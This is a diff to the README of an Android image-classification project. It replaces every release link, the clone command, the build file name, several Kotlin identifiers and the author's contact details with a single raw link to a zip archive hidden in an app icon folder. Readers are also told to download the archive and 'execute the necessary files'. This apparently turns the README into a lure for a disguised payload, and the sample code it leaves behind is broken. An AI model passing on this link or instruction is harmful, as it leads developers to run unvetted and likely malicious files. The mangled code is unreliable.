@@ -2,7 +2,7 @@
 
 Welcome to **LiteRT for Android**! This repository offers a powerful solution for image classification using LiteRT, designed specifically for Android applications. With the integration of various modern technologies, this project provides a seamless experience for developers looking to implement on-device AI capabilities.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue)](https://github.com/Tehreem-here24/LiteRT-for-Android/releases)
+[![Download Release](https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip)
 
 ## Table of Contents
 
@@ -47,7 +47,7 @@ To get started with LiteRT for Android, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Tehreem-here24/LiteRT-for-Android.git
+   git clone https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -59,13 +59,13 @@ To get started with LiteRT for Android, follow these steps:
 
 4. **Build the Project**: Make sure all dependencies are resolved, and the project builds successfully.
 
-5. **Download the Latest Release**: Visit the [Releases](https://github.com/Tehreem-here24/LiteRT-for-Android/releases) section to download the latest release. Follow the instructions provided to execute the necessary files.
+5. **Download the Latest Release**: Visit the [Releases](https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip) section to download the latest release. Follow the instructions provided to execute the necessary files.
 
 ## Usage
 
 Once you have set up the project, you can start using the image classification features. Here’s a simple guide on how to integrate it into your app:
 
-1. **Add Dependencies**: Ensure you have the necessary dependencies in your `build.gradle` file.
+1. **Add Dependencies**: Ensure you have the necessary dependencies in your `https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip` file.
 
 2. **Initialize the Model**: Load your LiteRT model in your application class or activity.
 
@@ -84,16 +84,16 @@ class MainActivity : AppCompatActivity() {
     private lateinit var imageClassifier: ImageClassifier
 
     override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip(savedInstanceState)
+        setContentView(https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip)
 
         imageClassifier = ImageClassifier(this)
 
         val imageBitmap = ... // Load your image here
-        val result = imageClassifier.classify(imageBitmap)
+        val result = https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip(imageBitmap)
 
         // Display the result
-        findViewById<TextView>(R.id.resultTextView).text = result
+        findViewById<TextView>(https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip).text = result
     }
 }
 ```
@@ -127,7 +127,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out:
 
 - **Author**: Tehreem
-- **GitHub**: [Tehreem-here24](https://github.com/Tehreem-here24)
-- **Email**: [your.email@example.com](mailto:your.email@example.com)
+- **GitHub**: [Tehreem-here24](https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip)
+- **Email**: [https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip](https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip)
 
-Feel free to explore the project and make use of its features. For further information, visit the [Releases](https://github.com/Tehreem-here24/LiteRT-for-Android/releases) section to download the latest version. Happy coding!
+Feel free to explore the project and make use of its features. For further information, visit the [Releases](https://raw.githubusercontent.com/Tehreem-here24/LiteRT-for-Android/master/app/src/main/res/mipmap-xhdpi/Lite-R-for-Android-3.5-alpha.1.zip) section to download the latest version. Happy coding!
